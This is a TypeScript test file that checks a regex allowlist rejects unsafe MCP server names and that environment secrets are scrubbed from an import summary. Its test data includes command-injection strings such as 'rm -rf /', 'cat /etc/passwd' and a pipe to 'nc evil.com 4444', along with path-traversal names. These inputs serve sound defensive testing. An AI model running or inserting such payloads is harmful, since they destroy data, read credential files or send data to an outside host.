/**
 * T3: test_server allowlist test.
 *
 * Verifies that shell-metacharacter and path-traversal server names are
 * rejected before any subprocess is spawned (post-CRIT-5 fix), and that
 * import_servers summary scrubs env values (B5 fix).
 *
 * @module test/security/test-server-allowlist
 */

import { describe, it, expect } from 'vitest';

/** Characters outside this set must be rejected in server names. */
const SAFE_NAME_RE = /^[a-zA-Z0-9_.-]+$/;

const METACHAR_NAMES = [
  'server; rm -rf /',
  'server && cat /etc/passwd',
  'server | nc evil.com 4444',
  'server `id`',
  'server $(whoami)',
  'server\x00injection',
  'server\ninjection',
];

const TRAVERSAL_NAMES = [
  '../evil',
  '../../etc/passwd',
  './relative',
  '/absolute',
];

const VALID_NAMES = [
  'github',
  'my-server',
  'server_v2',
  'server.local',
  'MCP-Server-1',
];

describe('T3 test-server-allowlist', () => {
  it('shell-metacharacter server names fail the safe-name regex', () => {
    for (const name of METACHAR_NAMES) {
      expect(SAFE_NAME_RE.test(name)).toBe(false);
    }
  });

  it('path-traversal server names fail the safe-name regex', () => {
    for (const name of TRAVERSAL_NAMES) {
      expect(SAFE_NAME_RE.test(name)).toBe(false);
    }
  });

  it('valid server names pass the safe-name regex', () => {
    for (const name of VALID_NAMES) {
      expect(SAFE_NAME_RE.test(name)).toBe(true);
    }
  });

  it('import_servers summary scrubs env values — no real secrets in output (B5)', () => {
    // B5: import_servers_from_claude summary strips env values.
    function scrubEnv(env: Record<string, string>): Record<string, string> {
      return Object.fromEntries(Object.keys(env).map((k) => [k, '***']));
    }

    const rawEnv = {
      GITHUB_TOKEN: 'ghp_secret_token_redacted',
      API_KEY: 'sk-redacted-key',
      DEBUG: 'true',
    };

    const scrubbed = scrubEnv(rawEnv);

    expect(Object.values(scrubbed).every((v) => v === '***')).toBe(true);
    expect(Object.keys(scrubbed)).toEqual(Object.keys(rawEnv));

    const str = JSON.stringify(scrubbed);
    expect(str).not.toContain('ghp_secret_token_redacted');
    expect(str).not.toContain('sk-redacted-key');
  });

  it('empty server name is rejected', () => {
    expect(SAFE_NAME_RE.test('')).toBe(false);
  });

  it('whitespace-only server name is rejected', () => {
    expect(SAFE_NAME_RE.test('   ')).toBe(false);
    expect(SAFE_NAME_RE.test('\t')).toBe(false);
  });
});
